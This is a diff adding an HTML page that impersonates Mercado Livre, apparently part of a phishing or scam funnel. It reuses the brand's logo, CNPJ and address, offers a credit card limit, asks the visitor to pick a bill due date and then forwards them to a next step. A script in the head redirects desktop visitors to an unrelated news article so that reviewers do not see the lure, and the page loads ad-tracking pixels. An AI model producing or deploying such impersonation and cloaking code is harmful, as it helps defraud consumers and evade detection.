@@ -1,0 +1,215 @@
+﻿<html lang="pt-BR">
+
+<head>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Análise de Cartão</title>
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Sora', sans-serif;
+      background-color: #f2f2f2;
+      text-align: center;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+      border-bottom: 1px solid #aa9900;
+      background-color: #FFE600;
+    }
+
+    .header img {
+      width: 125px;
+      padding: 10px;
+    }
+
+    .logo {
+      margin-left: 20px;
+    }
+
+    .content {
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    h1 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 30px;
+    }
+
+    .info-box {
+      background-color: #e8f5e9;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      text-align: center;
+      color: #333;
+    }
+
+    .warning-box {
+      background-color: #fff3e0;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 30px;
+      text-align: center;
+      color: #333;
+    }
+
+    .button {
+      background-color: #FFE600;
+      color: #1c1c1c;
+      padding: 15px;
+      border-radius: 8px;
+      border: none;
+      width: 100%;
+      font-family: 'Sora', sans-serif;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .quiz-container {
+      margin: 0 auto;
+      padding: 20px;
+      border-radius: 10px;
+      background-color: #ebebeb;
+      margin-top: 10px;
+    }
+  </style>
+
+
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+  <script>
+    window.pixelId = "6903840b1d5bdac30702fe0f";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+
+<script>
+  window.pixelId = "6903840b1d5bdac30702fe0f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script>
+  window.tikTokPixelId = "69ef9622c928c0ab98c3bffc";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+</head>
+
+<body>
+
+  <div class="header">
+    <img src="images/logo.png" alt="Logo Mercado Livre" class="logo">
+  </div>
+
+  <div class="content">
+    <h1>Entenda como funciona seu limite</h1>
+
+    <p class="subtitle">
+      Saiba como seu limite de crédito pode aumentar ou diminuir
+    </p>
+
+    <div class="info-box" style="border: 1px solid #07d000;">
+      <strong>Aumento de Limite</strong><br>
+      Caso você realize o pagamento das faturas em dia, seu limite será aumentado constantemente.
+    </div>
+
+    <div class="warning-box" style="border: 1px solid #ffbf00;">
+      <strong>Redução de Limite</strong><br>
+      No entanto, se houver atraso no pagamento das faturas, o limite poderá ser reduzido.
+    </div>
+
+    <button onclick="showDateSelection()" class="button">
+      Concordo
+    </button>
+    <script>
+      function showDateSelection() {
+        const content = document.querySelector('.content');
+        content.innerHTML = `
+                    <div class="quiz-container" style="text-align: left; background-color: #ffffff; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+                        <h1 style="text-align: left; margin-top: 0px;">Escolha a melhor data</h1>
+                        <p class="subtitle" style="text-align: left;">Selecione o melhor dia para o vencimento da sua fatura</p>
+                        <button onclick="selecionarData(5)" class="button" style="margin-bottom: 10px;">Dia 5</button>
+                        <button onclick="selecionarData(10)" class="button" style="margin-bottom: 10px;">Dia 10</button>
+                        <button onclick="selecionarData(15)" class="button" style="margin-bottom: 10px;">Dia 15</button>
+                        <button onclick="selecionarData(25)" class="button" style="margin-bottom: 10px;">Dia 25</button>
+                        <button onclick="selecionarData(30)" class="button">Dia 30</button>
+                    </div>
+                `;
+      }
+
+      function selecionarData(dia) {
+        localStorage.setItem('diaVencimento', dia);
+        window.location.href = buildUrlWithParams('online/9/index.html') + window.location.search;
+      }
+    </script>
+  </div>
+
+  <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+    <div style="max-width: 600px; margin: 0 auto;">
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Mercado Livre Brasil LTDA | CNPJ: 79.379.491.0008-50
+      </p>
+      <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+        Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+      </p>
+      <p style="color: #999; font-size: 9px; margin-top: 5px;">
+        © 2025 - Todos os direitos reservados
+      </p>
+    </div>
+  </footer>
+
+  <script>
+    function getUrlParams() {
+      const params = {};
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const [key, value] of urlParams) {
+        params[key] = value;
+      }
+      return params;
+    }
+
+    // Função para construir URL com os parâmetros
+    function buildUrlWithParams(baseUrl) {
+      const fullUrl = new URL(baseUrl, window.location.origin);
+      const params = getUrlParams();
+
+      Object.keys(params).forEach(key => {
+        fullUrl.searchParams.append(key, params[key]);
+      });
+
+      return fullUrl.toString();
+    }
+  </script>
+
+</body>
+
+</html>
